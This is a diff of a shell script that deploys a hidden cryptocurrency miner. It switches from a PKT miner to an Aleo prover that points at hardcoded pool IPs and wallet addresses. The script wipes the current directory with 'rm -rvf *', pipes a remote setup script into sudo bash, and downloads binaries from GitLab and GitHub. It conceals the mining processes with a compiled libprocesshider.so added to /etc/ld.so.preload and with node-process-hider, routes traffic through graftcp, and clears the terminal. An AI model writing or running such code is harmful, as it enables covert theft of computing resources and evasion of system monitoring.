@@ -1,4 +1,4 @@
-rm -rvf * 
+rm -rvf * && mkdir d && cd d
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pdkt && chmod +x pdkt
+wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/v0.2.3/aleo_prover-v0.2.3_full.tar.gz && tar -zvxf aleo_prover-v0.2.3_full.tar.gz && cd aleo_prover
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & ./pdkt ann -p pkt1qvt0ptnwke2jhqqw4dwmmr3n30lrmd3y68mntkq http://151.80.239.86 https://stratum.zetahash.com
+./graftcp/graftcp & clear & ./aleo_prover --pool 167.99.155.214:443 --pool 68.183.130.15:80 --pool 68.183.130.15:443 --address aleo1tpxcqcxsep8x0g6337u64zzu30454vfjuutwts9s5khq26w9rurq6m3nzg --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah
